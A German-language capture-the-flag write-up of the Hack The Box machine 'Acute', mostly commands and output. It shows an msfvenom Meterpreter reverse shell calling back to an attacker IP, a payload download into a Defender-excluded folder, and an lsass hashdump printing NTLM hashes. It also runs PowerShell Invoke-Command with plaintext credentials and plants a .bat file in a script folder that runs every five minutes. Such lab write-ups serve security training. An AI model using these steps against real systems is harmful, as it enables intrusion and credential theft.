---
title: Writeup_Acute
date: 2022-09-20 11:45:00 +0100
categories: [HTB, Maschine]
tags: [msfvenom, dirbuster, msfconsole, exiftool]
comments: false
---

Fangen wir mit dem üblichen nmap Scan an

```
──(bumble㉿kali)-[~]
└─$ nmap -sC -sV 10.129.160.202
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 07:05 UTC
Nmap scan report for 10.129.160.202
Host is up (0.045s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
|_http-title: Not Found
|_ssl-date: 2022-02-16T07:05:42+00:00; -5s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds
```

Nachdem wir "atsserver.acute.local" in unsere /etc/hosts hinzugefügt haben schauen wir uns die Seite etwas genauer an.

Auf https://atsserver.acute.local/about.html finden wir potenzielle Usernamen

Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins

Lassen wir mal Dirbuster laufen


![Bild1](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216080236.png){: width="700" height="400" }

Schauen wir uns das mal genauer an

https://atsserver.acute.local/New_Starter_CheckList_v7.docx

Folgender Eintrag ist zusätzlich interessant

```
IT overview

Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this.

Induction Coordinator
``` 

Ein Potenzielles Password: Password1!

Der Einzig brauche bare Link in dem Word Document leitet mich auf eine Web-Shell um


![Bild2](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216080659.png){: width="700" height="400" }

![Bild3](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216080724.png){: width="700" height="400" }

Leider kennen wir keinen Computernamen bisher, vielleicht hat das docx Document noch mehr Informationen wo wir aktuell nicht sehen.

```
┌──(bumble㉿kali)-[~/Schreibtisch/acute]
└─$ exiftool New_Starter_CheckList_v7.docx                             
ExifTool Version Number         : 12.39
File Name                       : New_Starter_CheckList_v7.docx
Directory                       : .
File Size                       : 34 KiB
File Modification Date/Time     : 2022:02:16 07:49:27+00:00
File Access Date/Time           : 2022:02:16 07:49:39+00:00
File Inode Change Date/Time     : 2022:02:16 07:57:42+00:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x079b7eb2
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000
```

Wir sehen einen Creator "FCastle" und einen Computernamen Acute-PC01.
Leider ist FCastle kein User wo bereits kennen, aber wir wissen nun wie die Benutzernamen aufgebaut sind.
Wir finden einen aktiven Zugang

![Bild4](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216082215.png){: width="700" height="400" }

![Bild5](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216081953.png){: width="700" height="400" }


```
PS C:\Users> 
dir
Directory: C:\Users
Mode                 LastWriteTime         Length Name                             ----                 -------------         ------ ----                             d-----        12/21/2021   1:01 PM                administrator.ACUTE             d-----        12/22/2021   1:26 AM                edavies                         d-----        12/21/2021  10:50 PM                jmorgan                         d-----        11/19/2021   9:29 AM                Natasha                         d-r---        11/18/2020  11:43 PM                Public
```

Nachdem ich Probleme mit dem Ausführen von Winpeas hatte, da Antivirus protected. 
```
PS C:\utils> 

reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\IpAddresses

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths

    C:\Utils    REG_DWORD    0x0

    C:\Windows\System32    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\TemporaryPaths

PS C:\utils>
```


```
┌──(bumble㉿kali)-[~/Schreibtisch/acute]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=9001 -f exe > bumble.exe
PS C:\utils> 

Invoke-WebRequest -Uri "http://10.10.14.12/bumble.exe" -OutFile "C:\utils\bumble.exe"

PS C:\utils> 

dir

    Directory: C:\utils

Mode                 LastWriteTime         Length Name                             ----                 -------------         ------ ----                             -a----         2/16/2022   9:12 AM          35762 bumble.bat                       -a----         2/16/2022   9:19 AM          73802 bumble.exe                       PS C:\utils>
``` 

und siehe da wir bekommen eine shell

``` 
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.12
lhost => 10.10.14.12
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.12:9001 
[*] Sending stage (175174 bytes) to 10.129.160.202
[*] Meterpreter session 1 opened (10.10.14.12:9001 -> 10.129.160.202:49842 ) at 2022-02-16 09:23:21 +0000

meterpreter > 
``` 
```
meterpreter > ps

Process List
============

 PID   PPID  Name        Arch  Session  User           Path
 ---   ----  ----        ----  -------  ----           ----
 0     0     [System Pr
             ocess]
 4956  3148  msedge.exe  x64   1        ACUTE\edavies  C:\Program Files (x
                                                       86)\Microsoft\Edge\
                                                       Application\msedge.
                                                       exe


meterpreter > migrate 3148
[*] Migrating from 3436 to 3148...
[*] Migration completed successfully.
meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /home/bumble/Schreibtisch/acute/cMxNqsxq.html
[*] Streaming...

```


![Bild10](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216095705.png){: width="700" height="400" }

![Bild11](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216100234.png){: width="700" height="400" }

![Bild12](/assets/Bilder/Maschine_Acute/Pasted%20image%2020220216100442.png){: width="700" height="400" }

Leider hat der selbe Code nicht funktioniert. Mit Hilfe von google bin auf Invoke-Command gekommen.

```
$passwd2 = ConvertTo-SecureString "W3_4R3_th3_f0rce." -ASPlainText -Force
$cred2 = New-Object System.Management.Automation.PSCredential ("acute\imonks",$passwd2)
Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {cat c:\Users\imonks\Desktop\user.txt}
```

```
PS C:\utils> Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {cat c:\Users\imonks\Desktop\user.txt}
Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {cat c:\Users\imonks\Desktop\user.txt}
f766e6cd95c23c5478bcae9c6761d740
``` 

Wir finden noch eine weitere Datei auf dem Desktop von dem user

```
PS C:\utils> Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {ls c:\Users\imonks\Desktop\}
Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {ls c:\Users\imonks\Desktop\}


    Directory: C:\Users\imonks\Desktop


Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-ar---        15/02/2022     17:34             34 user.txt                           ATSSERVER                         
-a----        11/01/2022     18:04            602 wm.ps1                             ATSSERVER                         


PS C:\utils> Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {cat c:\Users\imonks\Desktop\wm.ps1}
Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {cat c:\Users\imonks\Desktop\wm.ps1}
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

Schauen wir mal ob wir mit dem User und dem Befehl noch mehr erreichen.


```
PS C:\utils> Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {ls c:\Users\}
Invoke-Command ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {ls c:\Users\}


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
d-----        20/12/2021     23:30                .NET v4.5                          ATSSERVER                         
d-----        20/12/2021     23:30                .NET v4.5 Classic                  ATSSERVER                         
d-----        20/12/2021     20:38                Administrator                      ATSSERVER                         
d-----        21/12/2021     23:31                awallace                           ATSSERVER                         
d-----        21/12/2021     16:01                imonks                             ATSSERVER                         
d-----        22/12/2021     00:11                lhopkins                           ATSSERVER                         
d-r---        20/12/2021     20:38                Public                             ATSSERVER
```

Nachdem wir nun nur beschränkte Rechte auf den PC haben versuchen wir uns zum lokalen admin zu machen

```
PS C:\utils> Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {c:\Users\imonks\Desktop\wm.ps1}
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred2 -scriptblock {c:\Users\imonks\Desktop\wm.ps1}
The command completed successfully.
```

https://www.oreilly.com/library/view/mastering-metasploit/9781788990615/4d7912bf-2a5e-4c45-abf4-0d11b38f5e45.xhtml

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.
meterpreter > ps

Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System              x64   0
 72    4     Registry            x64   0
 108   620   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 384   4     smss.exe            x64   0
 436   620   SgrmBroker.exe      x64   0
 440   620   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 492   480   csrss.exe           x64   0
 508   620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 556   620   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 560   480   wininit.exe         x64   0
 568   552   csrss.exe           x64   1
 620   560   services.exe        x64   0
 632   560   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 660   552   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 676   988   msedge.exe          x64   1        ACUTE\edavies                 C:\Program Files (x86)\Microsoft\Edge
                                                                              \Application\msedge.exe
 740   620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 780   660   fontdrvhost.exe     x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 788   560   fontdrvhost.exe     x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 796   620   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 852   620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 884   620   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 960   620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 972   660   dwm.exe             x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 988   3804  msedge.exe          x64   1        ACUTE\edavies                 C:\Program Files (x86)\Microsoft\Edge
                                                                              \Application\msedge.exe
 1000  3804  SecurityHealthSyst  x64   1        ACUTE\edavies                 C:\Windows\System32\SecurityHealthSys
             ray.exe                                                          tray.exe
 1004  3804  OneDrive.exe        x64   1        ACUTE\edavies                 C:\Users\edavies\AppData\Local\Micros
                                                                              oft\OneDrive\OneDrive.exe
 1168  620   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1396  620   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1432  620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1496  620   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1632  988   msedge.exe          x64   1        ACUTE\edavies                 C:\Program Files (x86)\Microsoft\Edge
                                                                              \Application\msedge.exe
 1816  4     Memory Compression  x64   0
 1904  620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1912  620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1948  620   MsMpEng.exe         x64   0
 1956  620   svchost.exe         x64   0
 2236  3804  powershell.exe      x64   1        ACUTE\edavies                 C:\Windows\System32\WindowsPowerShell
                                                                              \v1.0\powershell.exe
 2368  3000  Utilman.exe         x64   1        ACUTE\edavies                 C:\Windows\System32\Utilman.exe
 2556  796   RuntimeBroker.exe   x64   1        ACUTE\edavies                 C:\Windows\System32\RuntimeBroker.exe
 2660  988   msedge.exe          x64   1        ACUTE\edavies                 C:\Program Files (x86)\Microsoft\Edge
                                                                              \Application\msedge.exe
 2812  620   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2960  4356  bumble.exe          x86   0        ACUTE\edavies                 C:\Utils\bumble.exe
 3000  440   cmd.exe             x64   1        ACUTE\edavies                 C:\Windows\System32\cmd.exe
 3084  620   uhssvc.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Microsoft Update Hea
                                                                              lth Tools\uhssvc.exe
 3120  620   NisSrv.exe          x64   0
 3316  620   SecurityHealthServ  x64   0
             ice.exe
 3340  620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3408  796   wsmprovhost.exe     x64   0        ACUTE\edavies                 C:\Windows\System32\wsmprovhost.exe
 3468  440   sihost.exe          x64   1        ACUTE\edavies                 C:\Windows\System32\sihost.exe
 3480  620   svchost.exe         x64   1        ACUTE\edavies                 C:\Windows\System32\svchost.exe
 3592  440   taskhostw.exe       x64   1        ACUTE\edavies                 C:\Windows\System32\taskhostw.exe
 3804  3792  explorer.exe        x64   1        ACUTE\edavies                 C:\Windows\explorer.exe
 3816  796   smartscreen.exe     x64   1        ACUTE\edavies                 C:\Windows\System32\smartscreen.exe
 3952  620   svchost.exe         x64   1        ACUTE\edavies                 C:\Windows\System32\svchost.exe
 4040  796   RuntimeBroker.exe   x64   1        ACUTE\edavies                 C:\Windows\System32\RuntimeBroker.exe
 4160  988   msedge.exe          x64   1        ACUTE\edavies                 C:\Program Files (x86)\Microsoft\Edge
                                                                              \Application\msedge.exe
 4356  796   wsmprovhost.exe     x64   0        ACUTE\edavies                 C:\Windows\System32\wsmprovhost.exe
 4568  796   StartMenuExperienc  x64   1        ACUTE\edavies                 C:\Windows\SystemApps\Microsoft.Windo
             eHost.exe                                                        ws.StartMenuExperienceHost_cw5n1h2txy
                                                                              ewy\StartMenuExperienceHost.exe
 4632  796   RuntimeBroker.exe   x64   1        ACUTE\edavies                 C:\Windows\System32\RuntimeBroker.exe
 4732  796   SearchApp.exe       x64   1        ACUTE\edavies                 C:\Windows\SystemApps\Microsoft.Windo
                                                                              ws.Search_cw5n1h2txyewy\SearchApp.exe
 4828  620   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4832  796   RuntimeBroker.exe   x64   1        ACUTE\edavies                 C:\Windows\System32\RuntimeBroker.exe
 4916  2236  conhost.exe         x64   1        ACUTE\edavies                 C:\Windows\System32\conhost.exe
 5008  620   svchost.exe         x64   0
 5088  796   MoUsoCoreWorker.ex  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\MoUsoCoreWorker.e
             e                                                                xe
 5256  796   dllhost.exe         x64   1        ACUTE\edavies                 C:\Windows\System32\dllhost.exe
 5260  620   svchost.exe         x64   0
 5408  620   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 5692  796   ShellExperienceHos  x64   1        ACUTE\edavies                 C:\Windows\SystemApps\ShellExperience
             t.exe                                                            Host_cw5n1h2txyewy\ShellExperienceHos
                                                                              t.exe
 5888  3000  conhost.exe         x64   1        ACUTE\edavies                 C:\Windows\System32\conhost.exe

meterpreter > migrate 632
[*] Migrating from 2960 to 632...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9
```

![[Pasted image 20220216183621.png]]

wir erhalten nun das Password Password@123

```
$passwd4 = ConvertTo-SecureString "Password@123" -ASPlainText -Force

$cred4 = New-Object System.Management.Automation.PSCredential ("acute\awallace",$passwd4)
```


```PS C:\Users> Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred4 -scriptblock {cat "C:\Program Files\keepmeon\keepmeon.bat"}
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred4 -scriptblock {cat "C:\Program Files\keepmeon\keepmeon.bat"}
REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)

```

``` 
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred4 -scriptblock {Set-Content -Path 'c:\program files\Keepmeon\bumble.bat' -Value 'net group site_admin awallace /delete /domain'}
```

```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred4 -scriptblock {cat "C:\Program Files\keepmeon\bumble.bat"}
```



```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred4 -scriptblock {whoami /groups}
``` 


```
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred4 -scriptblock {cat 'c:\users\administrator\desktop\root.txt'}
1517186db42f38021e6c1e503fecba28
```
